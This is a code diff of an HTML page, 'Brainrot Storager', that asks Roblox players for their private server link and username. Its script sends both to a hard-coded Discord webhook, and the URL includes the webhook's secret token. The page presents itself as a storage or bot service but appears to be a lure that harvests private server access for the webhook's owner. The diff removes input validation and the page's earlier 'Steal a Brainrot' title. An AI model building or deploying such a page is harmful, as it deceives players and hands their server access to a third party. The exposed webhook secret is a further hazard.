@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>SAB Bot storager!</title>
+  <title>🧠 Brainrot Storager</title>
   <style>
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background-color: #3e2723; /* Chocolate brown */
+      background-color: #3e2723; /* Deep chocolate */
       color: #ffc0cb; /* Pink text */
       text-align: center;
       padding: 50px;
@@ -50,7 +50,7 @@
   </style>
 </head>
 <body>
-  <h1>🧠 Steal a Brainrot</h1>
+  <h1>🧠 Brainrot Storager</h1>
   <div id="form-section">
     <input type="text" id="serverLink" placeholder="Enter Roblox Private Server Link"><br>
     <input type="text" id="username" placeholder="Enter Your Roblox Username"><br>
@@ -66,10 +66,6 @@
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1429933272770678824/HKS-kQ_0jZCMqF3esQW5-aYFhxdMbbMiqIR06RJSGYSUNTE62EA9DF0MMWcC6zI0GDSi";
 
-    function isValidPrivateServer(link) {
-      return /^https:\/\/www\.roblox\.com\/games\/\d+\/[^\/]+\/\?privateServerLinkCode=/.test(link);
-    }
-
     window.onload = function() {
       const saved = localStorage.getItem("brainrotData");
       if (saved) {
@@ -84,21 +80,16 @@
     };
 
     function storeInfo() {
-      const serverLink = document.getElementById("serverLink").value.trim();
-      const username = document.getElementById("username").value.trim();
+      const serverLink = document.getElementById("serverLink").value;
+      const username = document.getElementById("username").value;
 
-      if (!isValidPrivateServer(serverLink)) {
-        alert("Private server link not found. Please enter a valid Roblox private server link.");
-        return;
-      }
-
-      if (!username) {
-        alert("Please enter your Roblox username.");
+      if (!serverLink || !username) {
+        alert("Please fill out both fields.");
         return;
       }
 
       const payload = {
-        content: `🧠 Steal a Brainrot Submission\n🔗 Server: ${serverLink}\n👤 User: ${username}`
+        content: `🧠 Brainrot Submission\n🔗 Server: ${serverLink}\n👤 User: ${username}`
       };
 
       fetch(WEBHOOK_URL, {
@@ -131,4 +122,5 @@
   </script>
 </body>
 </html>
+
 
